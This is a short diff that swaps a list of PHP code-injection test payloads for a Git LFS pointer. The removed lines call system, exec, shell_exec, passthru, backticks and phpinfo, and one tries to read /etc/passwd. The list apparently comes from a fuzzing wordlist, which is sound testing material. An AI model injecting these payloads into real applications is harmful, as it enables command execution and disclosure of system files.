@@ -1,8 +1,3 @@
-phpinfo();
-system("id")
-;system("id")
-exec("id")
-shell_exec("id")
-`id`
-passthru("id")
-readfile(/etc/passwd
+version https://git-lfs.github.com/spec/v1
+oid sha256:d97b737a433b1b8e5841a25970d473ddf451151d0c261d84af131217d7ee3bba
+size 107
